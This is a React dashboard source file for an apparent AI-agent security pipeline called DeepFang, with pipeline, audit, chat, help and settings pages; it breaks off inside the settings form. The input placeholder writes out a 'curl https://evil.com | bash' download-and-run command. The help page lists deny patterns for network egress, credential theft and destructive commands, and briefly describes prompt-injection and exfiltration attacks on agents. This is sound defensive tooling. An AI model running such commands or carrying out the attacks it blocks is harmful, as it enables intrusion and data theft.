import { useState, useEffect, useCallback, useRef } from "react";
import { BrowserRouter, Routes, Route, NavLink, useNavigate } from "react-router-dom";
import {
  Shield, Gavel, Wrench, Activity, CheckCircle, XCircle,
  AlertTriangle, RefreshCw, Play, Clock, HelpCircle,
  MessageSquare, Settings, ChevronRight, Zap, Lock,
  Eye, BookOpen, Send, Loader2, ChevronDown, Radio,
  TerminalSquare, GitBranch, Cpu,
} from "lucide-react";
import axios from "axios";

// ── Constants ─────────────────────────────────────────────────────────────

const API = "/api";

// ── Types ─────────────────────────────────────────────────────────────────

interface HealthData {
  status: string;
  uptime_seconds: number;
  services: Record<string, string>;
  adjudication_log_count: number;
}

interface AuditEntry {
  timestamp: string;
  content_hash?: string;
  content: string;
  verdict: string;
  rationale: string;
  sanitize_score: number;
}

interface Settings {
  ollamaUrl: string;
  ollamaModel: string;
  useLocalLlm: boolean;
  adjudicatorModel: string;
}

const DEFAULT_SETTINGS: Settings = {
  ollamaUrl: "http://localhost:11434",
  ollamaModel: "qwen2.5:14b",
  useLocalLlm: false,
  adjudicatorModel: "deepseek-chat",
};

// ── Design tokens (inline since Tailwind v4 is config-less) ──────────────

const S = {
  surface: "bg-[#111114] border border-[#26262d]",
  raised:  "bg-[#18181c] border border-[#26262d]",
  muted:   "text-[#9898a8]",
  dim:     "text-[#55555f]",
  amber:   "text-[#f59e0b]",
  amberBg: "bg-[#f59e0b]",
  red:     "text-[#ef4444]",
  green:   "text-[#22c55e]",
  border:  "border-[#26262d]",
  border2: "border-[#32323c]",
  mono:    "font-mono",
};

// ── Shared components ─────────────────────────────────────────────────────

function Chip({ ok, label }: { ok: boolean; label: string }) {
  return (
    <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-mono font-medium border ${
      ok
        ? "border-[#14532d] bg-[rgba(34,197,94,0.08)] text-[#22c55e]"
        : "border-[#7f1d1d] bg-[rgba(239,68,68,0.08)] text-[#ef4444]"
    }`}>
      {ok ? <CheckCircle className="w-3 h-3" /> : <XCircle className="w-3 h-3" />}
      {label}
    </span>
  );
}

function SectionHead({ icon: Icon, title, action }: {
  icon: React.ComponentType<{ className?: string }>;
  title: string;
  action?: React.ReactNode;
}) {
  return (
    <div className="flex items-center justify-between mb-3">
      <div className="flex items-center gap-2">
        <Icon className="w-4 h-4 text-[#f59e0b]" />
        <span className="text-sm font-semibold tracking-wide uppercase text-[#9898a8]">{title}</span>
      </div>
      {action}
    </div>
  );
}

// ── Global health context (lifted so nav bar can show status) ─────────────

function useHealth() {
  const [health, setHealth] = useState<HealthData | null>(null);
  const fetch = useCallback(async () => {
    try {
      const { data } = await axios.get<HealthData>("/health");
      setHealth(data);
    } catch { setHealth(null); }
  }, []);
  useEffect(() => {
    fetch();
    const t = setInterval(fetch, 6000);
    return () => clearInterval(t);
  }, [fetch]);
  return { health, refetch: fetch };
}

// ── Shell / Layout ────────────────────────────────────────────────────────

function Shell() {
  const { health, refetch } = useHealth();
  const ok = health?.status === "healthy";

  const navItems = [
    { to: "/",        icon: TerminalSquare,  label: "Pipeline" },
    { to: "/audit",   icon: Clock,           label: "Audit"    },
    { to: "/chat",    icon: MessageSquare,   label: "Chat"     },
    { to: "/help",    icon: HelpCircle,      label: "Help"     },
    { to: "/settings",icon: Settings,        label: "Settings" },
  ];

  return (
    <div className="flex h-screen overflow-hidden">
      {/* Sidebar */}
      <nav className="w-14 lg:w-52 flex flex-col border-r border-[#26262d] bg-[#0a0a0b] shrink-0">
        {/* Logo */}
        <div className="flex items-center gap-3 px-3 py-4 border-b border-[#26262d]">
          <div className="w-8 h-8 rounded bg-[rgba(245,158,11,0.15)] border border-[rgba(245,158,11,0.3)] flex items-center justify-center shrink-0">
            <GitBranch className="w-4 h-4 text-[#f59e0b]" />
          </div>
          <div className="hidden lg:block">
            <p className="text-sm font-bold tracking-tight">DeepFang</p>
            <p className="text-xs text-[#55555f] font-mono">v0.2.0</p>
          </div>
        </div>

        {/* Nav links */}
        <div className="flex-1 flex flex-col gap-0.5 p-2 pt-3">
          {navItems.map(({ to, icon: Icon, label }) => (
            <NavLink
              key={to}
              to={to}
              end={to === "/"}
              className={({ isActive }) =>
                `flex items-center gap-3 px-2 py-2 rounded transition-colors text-sm ${
                  isActive
                    ? "bg-[rgba(245,158,11,0.1)] text-[#f59e0b] border border-[rgba(245,158,11,0.2)]"
                    : "text-[#9898a8] hover:text-[#e8e8ed] hover:bg-[#18181c]"
                }`
              }
            >
              <Icon className="w-4 h-4 shrink-0" />
              <span className="hidden lg:block font-medium">{label}</span>
            </NavLink>
          ))}
        </div>

        {/* Status footer */}
        <div className="p-2 border-t border-[#26262d]">
          <button
            onClick={refetch}
            className="flex items-center gap-2 w-full px-2 py-2 rounded hover:bg-[#18181c] transition-colors"
            title="Refresh health"
          >
            <div className={`w-2 h-2 rounded-full shrink-0 ${ok ? "bg-[#22c55e]" : "bg-[#ef4444]"} ${ok ? "pulse" : ""}`} />
            <span className="hidden lg:block text-xs text-[#55555f] font-mono truncate">
              {ok ? "healthy" : health ? "degraded" : "offline"}
            </span>
            <RefreshCw className="w-3 h-3 text-[#35353d] ml-auto hidden lg:block" />
          </button>
        </div>
      </nav>

      {/* Main content */}
      <main className="flex-1 overflow-y-auto">
        <Routes>
          <Route path="/"         element={<PipelinePage health={health} refetchHealth={refetch} />} />
          <Route path="/audit"    element={<AuditPage />} />
          <Route path="/chat"     element={<ChatPage />} />
          <Route path="/help"     element={<HelpPage />} />
          <Route path="/settings" element={<SettingsPage />} />
        </Routes>
      </main>
    </div>
  );
}

// ── Pipeline page ─────────────────────────────────────────────────────────

function PipelinePage({ health, refetchHealth }: { health: HealthData | null; refetchHealth: () => void }) {
  const [input, setInput] = useState("");
  const [result, setResult] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [activeStage, setActiveStage] = useState<number | null>(null);

  const services = health?.services ?? {};
  const sanitizerOk = services.zeroclaw === "healthy" || services.sanitizer === "healthy";
  const deepseekOk  = services.deepseek === "healthy";
  const workerOk    = services.moltbot === "healthy" || services.worker === "healthy";

  const stages = [
    { icon: Shield,  label: "Sanitizer",   sub: "Regex · threat score",   port: 10958, ok: sanitizerOk },
    { icon: Gavel,   label: "Adjudicator", sub: "DeepSeek-V4-Pro · LLM",  port: 10959, ok: deepseekOk  },
    { icon: Wrench,  label: "Worker",      sub: "Air-gapped · no WAN",    port: 10960, ok: workerOk    },
  ];

  const runPipeline = async () => {
    if (!input.trim()) return;
    setLoading(true);
    setResult(null);
    setActiveStage(0);
    try {
      // Visually step through stages while waiting
      const t1 = setTimeout(() => setActiveStage(1), 600);
      const t2 = setTimeout(() => setActiveStage(2), 2000);
      const { data } = await axios.post(`${API}/pipeline`, { content: input, source: "dashboard" });
      clearTimeout(t1); clearTimeout(t2);
      setActiveStage(null);
      setResult(JSON.stringify(data, null, 2));
    } catch (e: unknown) {
      setActiveStage(null);
      setResult(`Error: ${e instanceof Error ? e.message : String(e)}`);
    } finally {
      setLoading(false);
    }
  };

  const resultObj = result ? (() => { try { return JSON.parse(result); } catch { return null; } })() : null;
  const passed = resultObj?.passed;

  return (
    <div className="p-6 space-y-6 max-w-3xl fade-up">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold tracking-tight">Pipeline</h1>
          <p className="text-sm text-[#9898a8] mt-0.5">sanitize → adjudicate → dispatch</p>
        </div>
        <button onClick={refetchHealth} className="p-2 rounded hover:bg-[#18181c] text-[#55555f] transition-colors">
          <RefreshCw className="w-4 h-4" />
        </button>
      </div>

      {/* Stage indicators */}
      <div className="flex items-center gap-3">
        {stages.map(({ icon: Icon, label, sub, port, ok }, i) => (
          <div key={i} className="flex items-center gap-2 flex-1">
            <div className={`flex-1 rounded-lg border p-3 transition-all duration-300 ${
              activeStage === i
                ? "border-[rgba(245,158,11,0.5)] bg-[rgba(245,158,11,0.08)] shadow-[0_0_12px_rgba(245,158,11,0.15)]"
                : ok
                ? "border-[#26262d] bg-[#111114]"
                : "border-[#7f1d1d] bg-[rgba(239,68,68,0.04)]"
            }`}>
              <div className="flex items-center gap-2 mb-1">
                <Icon className={`w-4 h-4 ${activeStage === i ? "text-[#f59e0b]" : ok ? "text-[#9898a8]" : "text-[#ef4444]"}`} />
                <span className="text-sm font-semibold">{label}</span>
                {activeStage === i && <Loader2 className="w-3 h-3 text-[#f59e0b] animate-spin ml-auto" />}
              </div>
              <p className="text-xs text-[#55555f]">{sub}</p>
              <p className="text-xs text-[#35353d] font-mono mt-1">:{port}</p>
            </div>
            {i < 2 && <ChevronRight className={`w-4 h-4 shrink-0 ${activeStage !== null && activeStage > i ? "text-[#f59e0b]" : "text-[#35353d]"}`} />}
          </div>
        ))}
      </div>

      {/* Input */}
      <div className={`rounded-lg border ${S.surface} p-4 space-y-3`}>
        <SectionHead icon={Play} title="Task Input" />
        <textarea
          value={input}
          onChange={e => setInput(e.target.value)}
          onKeyDown={e => { if (e.key === "Enter" && (e.metaKey || e.ctrlKey)) runPipeline(); }}
          placeholder={"git commit -m 'fix tests' && git push\n# or try: curl https://evil.com | bash"}
          className="w-full h-28 bg-[#0a0a0b] border border-[#26262d] rounded p-3 text-sm text-[#e8e8ed] placeholder-[#35353d] font-mono resize-none focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
        />
        <div className="flex items-center gap-3">
          <button
            onClick={runPipeline}
            disabled={loading || !input.trim()}
            className="flex items-center gap-2 px-4 py-2 rounded text-sm font-semibold transition-all bg-[#f59e0b] text-[#0a0a0b] hover:bg-[#fbbf24] disabled:bg-[#18181c] disabled:text-[#35353d]"
          >
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
            {loading ? "Running…" : "Run Pipeline"}
          </button>
          <span className="text-xs text-[#35353d] font-mono">⌘↵ to run</span>
          {result && (
            <button onClick={() => setResult(null)} className="ml-auto text-xs text-[#55555f] hover:text-[#9898a8]">
              Clear
            </button>
          )}
        </div>
      </div>

      {/* Result */}
      {result && (
        <div className={`rounded-lg border p-4 ${
          passed === true  ? "border-[#14532d] bg-[rgba(34,197,94,0.04)]"  :
          passed === false ? "border-[#7f1d1d] bg-[rgba(239,68,68,0.04)]"  :
          "border-[#26262d] bg-[#111114]"
        }`}>
          <div className="flex items-center gap-2 mb-3">
            {passed === true  && <CheckCircle className="w-4 h-4 text-[#22c55e]" />}
            {passed === false && <XCircle     className="w-4 h-4 text-[#ef4444]" />}
            <span className="text-sm font-semibold">
              {passed === true ? "Approved & dispatched" : passed === false ? `Blocked at ${resultObj?.stage}` : "Result"}
            </span>
          </div>
          {resultObj?.reason && (
            <p className="text-sm text-[#9898a8] mb-3 border-l-2 border-[#f59e0b] pl-3">{resultObj.reason}</p>
          )}
          <details className="group">
            <summary className="text-xs text-[#55555f] cursor-pointer hover:text-[#9898a8] select-none flex items-center gap-1">
              <ChevronDown className="w-3 h-3 group-open:rotate-180 transition-transform" /> Raw JSON
            </summary>
            <pre className="mt-2 text-xs text-[#9898a8] font-mono overflow-x-auto whitespace-pre-wrap leading-relaxed">{result}</pre>
          </details>
        </div>
      )}
    </div>
  );
}

// ── Audit page ────────────────────────────────────────────────────────────

function AuditPage() {
  const [entries, setEntries] = useState<AuditEntry[]>([]);
  const [loading, setLoading] = useState(true);

  const fetch = useCallback(async () => {
    try {
      const { data } = await axios.get(`${API}/audit?limit=100`);
      setEntries((data.entries || []).slice().reverse());
    } catch { /* ignore */ }
    finally { setLoading(false); }
  }, []);

  useEffect(() => { fetch(); }, [fetch]);

  const approvals = entries.filter(e => e.verdict === "approve").length;
  const denials   = entries.filter(e => e.verdict !== "approve").length;

  return (
    <div className="p-6 space-y-5 fade-up">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold tracking-tight">Audit Log</h1>
          <p className="text-sm text-[#9898a8] mt-0.5">All adjudication decisions</p>
        </div>
        <button onClick={fetch} className="flex items-center gap-1.5 text-xs text-[#55555f] hover:text-[#9898a8] transition-colors">
          <RefreshCw className="w-3.5 h-3.5" /> Refresh
        </button>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        {[
          { label: "Total",    value: entries.length, color: "text-[#e8e8ed]"  },
          { label: "Approved", value: approvals,       color: "text-[#22c55e]" },
          { label: "Blocked",  value: denials,         color: "text-[#ef4444]" },
        ].map(({ label, value, color }) => (
          <div key={label} className={`rounded-lg border ${S.surface} p-4`}>
            <p className="text-xs text-[#55555f] font-mono uppercase tracking-wider mb-1">{label}</p>
            <p className={`text-2xl font-bold font-mono ${color}`}>{value}</p>
          </div>
        ))}
      </div>

      {/* Log */}
      <div className={`rounded-lg border ${S.surface} divide-y divide-[#1e1e24]`}>
        {loading && (
          <div className="p-8 text-center text-sm text-[#55555f]">
            <Loader2 className="w-5 h-5 animate-spin mx-auto mb-2 text-[#f59e0b]" />
            Loading…
          </div>
        )}
        {!loading && entries.length === 0 && (
          <div className="p-8 text-center text-sm text-[#55555f]">
            No adjudications yet. Run a task through the Pipeline page.
          </div>
        )}
        {entries.map((e, i) => (
          <div key={i} className="flex items-start gap-3 px-4 py-3 hover:bg-[#18181c] transition-colors">
            {e.verdict === "approve"
              ? <CheckCircle className="w-4 h-4 text-[#22c55e] shrink-0 mt-0.5" />
              : <AlertTriangle className="w-4 h-4 text-[#ef4444] shrink-0 mt-0.5" />}
            <div className="flex-1 min-w-0 space-y-0.5">
              <div className="flex items-center gap-2 flex-wrap">
                <span className={`text-xs font-mono font-semibold ${e.verdict === "approve" ? "text-[#22c55e]" : "text-[#ef4444]"}`}>
                  {e.verdict.toUpperCase()}
                </span>
                {e.sanitize_score != null && (
                  <span className="text-xs text-[#55555f] font-mono">
                    score={e.sanitize_score.toFixed(2)}
                  </span>
                )}
                {e.content_hash && (
                  <span className="text-xs text-[#35353d] font-mono">{e.content_hash}</span>
                )}
              </div>
              <p className="text-sm text-[#e8e8ed] font-mono truncate">{e.content}</p>
              {e.rationale && (
                <p className="text-xs text-[#9898a8] truncate">{e.rationale}</p>
              )}
            </div>
            <span className="text-xs text-[#35353d] font-mono shrink-0 tabular-nums">
              {e.timestamp?.slice(11, 19)}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Chat page ─────────────────────────────────────────────────────────────

interface Message { role: "user" | "assistant"; content: string; ts: number; }

const SYSTEM_PROMPT = `You are DeepFang Expert — a specialist in AI agent security, execution isolation, and the DeepFang pipeline specifically.

DeepFang context:
- Three-stage pipeline: Sanitizer (regex, <5ms, :10958) → Adjudicator (DeepSeek-V4-Pro, :10959) → Worker (air-gapped Docker, :10960)
- Worker network: internal: true — no WAN egress at kernel level
- Sanitizer rules in configs/sanitizer/rules.yaml — 6 hard denies, 5 safe allows
- Worker allowlist: git, python, python3, node, npm, npx, uv, cargo, go, pwsh, mkdir, cp, mv, cat, echo, ls
- RoboFang integration: security.validate_action() pre-screens mcp_windows-operations_*, mcp_docker_*, skill_execute, skill_mutate
- Fail-closed everywhere: if any stage unreachable, task is blocked

You have deep expertise in:
- Prompt injection attacks and mitigations
- Docker network isolation design
- LLM-based security adjudication
- Supply chain and dependency confusion attacks
- Agentic AI security patterns

Be precise, practical, and honest about limitations. If asked about something outside DeepFang or AI security, answer helpfully but note it's outside your specialty.`;

function ChatPage() {
  const [messages, setMessages] = useState<Message[]>([
    {
      role: "assistant",
      content: "DeepFang Expert online. Ask me about the pipeline, attack vectors, integration patterns, or anything related to AI agent execution security.",
      ts: Date.now(),
    },
  ]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [settings] = useState<Settings>(() => {
    try { return { ...DEFAULT_SETTINGS, ...JSON.parse(localStorage.getItem("deepfang-settings") ?? "{}") }; }
    catch { return DEFAULT_SETTINGS; }
  });
  const bottomRef = useRef<HTMLDivElement>(null);
  const navigate  = useNavigate();

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const send = async () => {
    const text = input.trim();
    if (!text || loading) return;
    setInput("");
    const userMsg: Message = { role: "user", content: text, ts: Date.now() };
    setMessages(prev => [...prev, userMsg]);
    setLoading(true);

    try {
      const history = [...messages, userMsg].map(m => ({ role: m.role, content: m.content }));
      let reply = "";

      if (settings.useLocalLlm) {
        // Ollama
        const res = await axios.post(`${settings.ollamaUrl}/api/chat`, {
          model: settings.ollamaModel,
          messages: [{ role: "system", content: SYSTEM_PROMPT }, ...history],
          stream: false,
        }, { timeout: 60000 });
        reply = res.data.message?.content ?? "No response from Ollama.";
      } else {
        // DeepSeek via deepfang bridge
        const res = await axios.post(`${API}/chat`, {
          messages: history,
          system: SYSTEM_PROMPT,
          model: settings.adjudicatorModel,
        }, { timeout: 30000 });
        reply = res.data.content ?? res.data.response ?? JSON.stringify(res.data);
      }

      setMessages(prev => [...prev, { role: "assistant", content: reply, ts: Date.now() }]);
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      const isOllama = msg.includes("Network") || msg.includes("ECONNREFUSED");
      setMessages(prev => [...prev, {
        role: "assistant",
        content: isOllama
          ? `Cannot reach Ollama at ${settings.ollamaUrl}. Check that Ollama is running and the URL is correct in Settings.`
          : `Error: ${msg}. If using local LLM, verify settings. If using DeepSeek bridge, check the stack is running.`,
        ts: Date.now(),
      }]);
    } finally {
      setLoading(false);
    }
  };

  const modelLabel = settings.useLocalLlm
    ? `${settings.ollamaModel} (local)`
    : `${settings.adjudicatorModel} (DeepSeek)`;

  return (
    <div className="flex flex-col h-full fade-up">
      {/* Header */}
      <div className="flex items-center justify-between px-6 py-4 border-b border-[#26262d] shrink-0">
        <div>
          <h1 className="text-xl font-bold tracking-tight">DeepFang Expert</h1>
          <p className="text-xs text-[#55555f] font-mono mt-0.5 flex items-center gap-1.5">
            <Radio className="w-3 h-3 text-[#f59e0b]" />
            {modelLabel}
          </p>
        </div>
        <button
          onClick={() => navigate("/settings")}
          className="text-xs text-[#55555f] hover:text-[#9898a8] flex items-center gap-1 transition-colors"
        >
          <Settings className="w-3.5 h-3.5" /> Switch model
        </button>
      </div>

      {/* Messages */}
      <div className="flex-1 overflow-y-auto px-6 py-4 space-y-4">
        {messages.map((m, i) => (
          <div key={i} className={`flex gap-3 msg-enter ${m.role === "user" ? "justify-end" : ""}`}>
            {m.role === "assistant" && (
              <div className="w-7 h-7 rounded bg-[rgba(245,158,11,0.15)] border border-[rgba(245,158,11,0.25)] flex items-center justify-center shrink-0 mt-0.5">
                <Shield className="w-3.5 h-3.5 text-[#f59e0b]" />
              </div>
            )}
            <div className={`max-w-[75%] rounded-lg px-4 py-3 text-sm leading-relaxed ${
              m.role === "user"
                ? "bg-[rgba(245,158,11,0.1)] border border-[rgba(245,158,11,0.2)] text-[#e8e8ed]"
                : "bg-[#111114] border border-[#26262d] text-[#e8e8ed]"
            }`}>
              <p className="whitespace-pre-wrap">{m.content}</p>
              <p className="text-[10px] text-[#35353d] font-mono mt-2">
                {new Date(m.ts).toLocaleTimeString()}
              </p>
            </div>
          </div>
        ))}
        {loading && (
          <div className="flex gap-3">
            <div className="w-7 h-7 rounded bg-[rgba(245,158,11,0.15)] border border-[rgba(245,158,11,0.25)] flex items-center justify-center shrink-0">
              <Shield className="w-3.5 h-3.5 text-[#f59e0b]" />
            </div>
            <div className="bg-[#111114] border border-[#26262d] rounded-lg px-4 py-3">
              <Loader2 className="w-4 h-4 animate-spin text-[#f59e0b]" />
            </div>
          </div>
        )}
        <div ref={bottomRef} />
      </div>

      {/* Input */}
      <div className="px-6 py-4 border-t border-[#26262d] shrink-0">
        <div className="flex gap-2">
          <input
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } }}
            placeholder="Ask about pipeline stages, attack vectors, integration patterns…"
            className="flex-1 bg-[#111114] border border-[#26262d] rounded-lg px-4 py-2.5 text-sm text-[#e8e8ed] placeholder-[#35353d] focus:outline-none focus:border-[rgba(245,158,11,0.4)] transition-colors"
          />
          <button
            onClick={send}
            disabled={loading || !input.trim()}
            className="flex items-center justify-center w-10 h-10 rounded-lg bg-[#f59e0b] hover:bg-[#fbbf24] disabled:bg-[#18181c] disabled:text-[#35353d] text-[#0a0a0b] transition-colors shrink-0"
          >
            <Send className="w-4 h-4" />
          </button>
        </div>
        <p className="text-[10px] text-[#35353d] font-mono mt-2">Enter to send · Shift+Enter for newline</p>
      </div>
    </div>
  );
}

// ── Help page ─────────────────────────────────────────────────────────────

function HelpBlock({ icon: Icon, title, children }: {
  icon: React.ComponentType<{ className?: string }>;
  title: string;
  children: React.ReactNode;
}) {
  return (
    <div className={`rounded-lg border ${S.surface} overflow-hidden`}>
      <div className="flex items-center gap-2.5 px-4 py-3 border-b border-[#26262d] bg-[#18181c]">
        <Icon className="w-4 h-4 text-[#f59e0b]" />
        <h3 className="text-sm font-semibold tracking-wide">{title}</h3>
      </div>
      <div className="p-4 text-sm text-[#9898a8] space-y-3">{children}</div>
    </div>
  );
}

function Mono({ children }: { children: string }) {
  return <code className="px-1.5 py-0.5 rounded bg-[#18181c] border border-[#26262d] text-[#f59e0b] text-xs font-mono">{children}</code>;
}

function HelpPage() {
  return (
    <div className="p-6 space-y-5 max-w-3xl fade-up">
      <div>
        <h1 className="text-xl font-bold tracking-tight">Help</h1>
        <p className="text-sm text-[#9898a8] mt-0.5">Documentation and reference</p>
      </div>

      <HelpBlock icon={Shield} title="What DeepFang Does">
        <p className="text-[#e8e8ed]">
          DeepFang screens every AI agent task through a three-stage pipeline before anything runs.
          It sits between the agent and execution, blocking dangerous or unexpected tasks.
        </p>
        <div className="space-y-2 pt-1">
          {[
            { stage: "Stage 1 — Sanitizer", desc: "Regex pattern matching against rules.yaml. Executes in <5ms. Blocks known dangerous patterns before any LLM is involved.", port: "10958" },
            { stage: "Stage 2 — Adjudicator", desc: "DeepSeek-V4-Pro reads the full task in context. Classifies intent as approve or deny with a written rationale.", port: "10959" },
            { stage: "Stage 3 — Worker", desc: "Air-gapped Docker container with internal: true — no internet route at the kernel level. Runs approved tasks against your local Git repos.", port: "10960" },
          ].map(({ stage, desc, port }) => (
            <div key={stage} className="flex gap-3">
              <Mono>{`:${port}`}</Mono>
              <div>
                <p className="text-[#e8e8ed] font-medium">{stage}</p>
                <p className="text-[#55555f] text-xs mt-0.5">{desc}</p>
              </div>
            </div>
          ))}
        </div>
      </HelpBlock>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
        <HelpBlock icon={XCircle} title="Hard Denies (Stage 1)">
          <div className="space-y-1.5 text-xs">
            {[
              ["Destructive FS", "rm -rf, del /f, format, dd if="],
              ["Network egress", "curl, wget, nc, Invoke-WebRequest"],
              ["Credential theft", "cat /etc/passwd, env | curl"],
              ["Code injection", "eval(), exec(), backtick subst."],
              ["Privilege esc.", "sudo, dangerous chmod/chown"],
              ["Encoded payloads", "PowerShell -enc, piped base64"],
            ].map(([label, ex]) => (
              <div key={label} className="flex gap-2">
                <XCircle className="w-3.5 h-3.5 text-[#ef4444] shrink-0 mt-0.5" />
                <span className="text-[#9898a8]"><span className="text-[#e8e8ed]">{label}</span> — {ex}</span>
              </div>
            ))}
          </div>
        </HelpBlock>

        <HelpBlock icon={CheckCircle} title="Safe Allows (score reduction)">
          <div className="space-y-1.5 text-xs">
            {[
              ["Git ops", "add, commit, push, pull, clone"],
              ["Package managers", "uv, npm, pip, cargo build"],
              ["File ops", "mkdir, cp, mv, New-Item"],
              ["Build tools", "cargo build, go test, pytest"],
              ["Inspection", "git status, git log, ls"],
            ].map(([label, ex]) => (
              <div key={label} className="flex gap-2">
                <CheckCircle className="w-3.5 h-3.5 text-[#22c55e] shrink-0 mt-0.5" />
                <span className="text-[#9898a8]"><span className="text-[#e8e8ed]">{label}</span> — {ex}</span>
              </div>
            ))}
          </div>
        </HelpBlock>
      </div>

      <HelpBlock icon={Zap} title="Attack Vectors Mitigated">
        <div className="space-y-3">
          {[
            { name: "Prompt injection via fetched content", desc: "Hidden instructions in web pages or documents fetched by an agent. Stage 1 catches the injected command; Stage 3 physically blocks exfiltration." },
            { name: "Destructive command scope errors", desc: "Agent generates rm -rf / instead of rm -rf ./build. Hard-blocked by Stage 1 before the command runs." },
            { name: "Network egress from worker", desc: "Even approved code that tries to phone home — Stage 3's internal: true network has no WAN route at the kernel level." },
            { name: "Credential exfiltration", desc: "Reading ~/.env or /etc/passwd to pipe externally. Stage 1 blocks the pattern; Stage 3 makes sending it impossible." },
            { name: "Chained attacks (one bad step in 20)", desc: "Stage 1 evaluates all lines of the full task. Stage 2 reads the complete task for semantic intent." },
          ].map(({ name, desc }) => (
            <div key={name} className="border-l-2 border-[#f59e0b] pl-3">
              <p className="text-[#e8e8ed] font-medium text-xs">{name}</p>
              <p className="text-[#55555f] text-xs mt-0.5">{desc}</p>
            </div>
          ))}
        </div>
        <p className="text-xs text-[#35353d] pt-1 border-t border-[#26262d] mt-2">
          Full detail: <Mono>docs/ATTACK_VECTORS.md</Mono>
        </p>
      </HelpBlock>

      <HelpBlock icon={Lock} title="Failure Modes — all fail-closed">
        <div className="space-y-1.5 text-xs">
          {[
            ["Sanitizer unreachable", "Pipeline stops — nothing proceeds"],
            ["DeepSeek API timeout", "Returns deny — task blocked"],
            ["DeepSeek key not set", "Returns deny (UNCONFIGURED)"],
            ["Worker unreachable", "Dispatch returns error"],
            ["Stack down in RoboFang", "High-risk tool calls blocked"],
          ].map(([failure, behaviour]) => (
            <div key={failure} className="flex gap-2">
              <AlertTriangle className="w-3.5 h-3.5 text-[#f59e0b] shrink-0 mt-0.5" />
              <span className="text-[#9898a8]"><span className="text-[#e8e8ed]">{failure}</span> — {behaviour}</span>
            </div>
          ))}
        </div>
      </HelpBlock>

      <HelpBlock icon={BookOpen} title="MCP Tools">
        <div className="space-y-2 text-xs">
          {[
            ["deepfang_pipeline",         "Full pipeline in one call — the main entry point"],
            ["deepfang_sanitize",         "Stage 1 only — fast regex scan, returns threat score"],
            ["deepfang_adjudicate",       "Stage 2 only — LLM verdict with rationale"],
            ["deepfang_dispatch",         "Stage 3 only — requires prior approval in audit log"],
            ["deepfang_audit",            "Query the adjudication log"],
            ["deepfang_status",           "Health check across all pipeline services"],
            ["deepfang_agentic_workflow", "Multi-step goal via FastMCP 3.2 sampling"],
          ].map(([tool, desc]) => (
            <div key={tool} className="flex gap-2 items-start">
              <Mono>{tool}</Mono>
              <span className="text-[#55555f] self-center">{desc}</span>
            </div>
          ))}
        </div>
        <p className="text-xs text-[#35353d] pt-2 border-t border-[#26262d] font-mono">
          Connect: <span className="text-[#55555f]">http://localhost:10956/sse</span>
        </p>
      </HelpBlock>
    </div>
  );
}

// ── Settings page ─────────────────────────────────────────────────────────

function SettingsPage() {
  const [s, setS] = useState<Settings>(() => {
    try { return { ...DEFAULT_SETTINGS, ...JSON.parse(localStorage.getItem("deepfang-settings") ?? "{}") }; }
    catch { return DEFAULT_SETTINGS; }
  });
  const [models, setModels] = useState<string[]>([]);
  const [fetchingModels, setFetchingModels] = useState(false);
  const [saved, setSaved] = useState(false);
  const [testResult, setTestResult] = useState<string | null>(null);

  const save = () => {
    localStorage.setItem("deepfang-settings", JSON.stringify(s));
    setSaved(true);
    setTimeout(() => setSaved(false), 2000);
  };

  const fetchModels = async () => {
    setFetchingModels(true);
    setModels([]);
    try {
      const { data } = await axios.get(`${s.ollamaUrl}/api/tags`, { timeout: 5000 });
      const names: string[] = (data.models ?? []).map((m: { name: string }) => m.name);
      setModels(names);
      setTestResult(`✓ Connected — ${names.length} model${names.length !== 1 ? "s" : ""} available`);
    } catch (e: unknown) {
      setTestResult(`✗ ${e instanceof Error ? e.message : "Connection failed"}`);
    } finally {
      setFetchingModels(false);
    }
  };

  const update = (patch: Partial<Settings>) => setS(prev => ({ ...prev, ...patch }));

  return (
    <div className="p-6 space-y-6 max-w-2xl fade-up">
      <div>
        <h1 className="text-xl font-bold tracking-tight">Settings</h1>
        <p className="text-sm text-[#9898a8] mt-0.5">LLM configuration and model selection</p>
      </div>

      {/* LLM Mode */}
      <div className={`rounded-lg border ${S.surface} p-5 space-y-4`}>
        <SectionHead icon={Cpu} title="LLM Mode" />
        <div className="grid grid-cols-2 gap-3">
          {[
            { id: false, label: "DeepSeek (cloud)", sub: "Via the adjudicator bridge at :10959. Requires DEEPSEEK_API_KEY in .env." },
            { id: true,  label: "Ollama (local)",   sub: "Your local Ollama instance. Zero API cost. Requires Ollama running on Goliath." },
          ].map(({ id, label, sub }) => (
            <button
              key={String(id)}
              onClick={() => update({ useLocalLlm: id })}
              className={`rounded-lg border p-4 text-left transition-all ${
                s.useLocalLlm === id
                  ? "border-[rgba(245,158,11,0.5)] bg-[rgba(245,158,11,0.08)]"
                  : "border-[#26262d] hover:border-[#32323c] bg-[#18181c]"
              }`}
            >
              <div className="flex items-center gap-2 mb-1.5">
                <div className={`w-3 h-3 rounded-full border-2 ${s.useLocalLlm === id ? "border-[#f59e0b] bg-[#f59e0b]" : "border-[#32323c]"}`} />
                <span className="text-sm font-semibold">{label}</span>
              </div>
              <p className="text-xs text-[#55555f] leading-relaxed">{sub}</p>
            </button>
          ))}
        </div>
      </div>

      {/* DeepSeek settings */}
      {!s.useLocalLlm && (
        <div className={`rounded-lg border ${S.surface} p-5 space-y-4`}>
          <SectionHead icon={Gavel} title="DeepSeek Model" />
          <div className="space-y-3">
            <label className="block">
              <span className="text-xs text-[#55555f] font-mono uppercase tracking-wider block mb-1.5">Model</span>
              <select
                value={s.adjudicatorModel}
                onChange={e => update({ adjudicatorModel: e.target.value })}
